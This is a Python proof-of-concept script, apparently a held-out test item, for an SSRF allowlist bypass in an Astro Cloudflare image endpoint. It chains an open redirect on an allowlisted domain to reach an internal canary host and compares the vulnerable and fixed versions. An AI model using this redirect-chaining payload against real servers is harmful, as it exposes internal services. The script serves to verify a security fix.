#!/usr/bin/env python3
"""
HELD-OUT residual PoC — CVE-2026-41321, the incomplete fix of CVE-2025-58179.

The isRemoteAllowed() allowlist (added in the 12.6.6 / GHSA-qpr4 fix and carried
into the 13.x image-transform endpoint) validates only the INITIAL href. The
13.1.9 endpoint then fetches it with the WHATWG default redirect:'follow'. So an
open redirect on an ALLOW-LISTED domain lets the Cloudflare Worker follow a 302
to an arbitrary internal host — the allowlist is bypassed (blind SSRF).

Payload: an allowlisted-domain href whose open redirect points at the internal,
non-allowlisted canary:
    /_image?href=http://allowed/redirect?to=http://canary/resid-<profile>

  * v1 = @astrojs/cloudflare 13.1.9  -> fetch(imageSrc)                 -> 302 followed -> canary REACHED (flag)
  * v2 = @astrojs/cloudflare 13.1.10 -> fetch(imageSrc,{redirect:manual}) + 3xx->404 -> canary NOT reached

    python3 bypass_poc.py --base-url http://127.0.0.1:4311 --profile v1
"""
import argparse
import urllib.parse
import urllib.request


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--profile", default="v1")
    a = ap.parse_args()
    inner = f"http://canary/resid-{a.profile}"
    href = f"http://allowed/redirect?to={inner}"
    url = f"{a.base_url.rstrip('/')}/_image?href={urllib.parse.quote(href, safe='')}&w=64&f=webp"
    print("GET", url)
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            print("HTTP", r.status)
    except urllib.error.HTTPError as e:
        print("HTTP", e.code)
    print("Check the canary hit log (shared volume) for path=/resid-%s + flag." % a.profile)


if __name__ == "__main__":
    main()
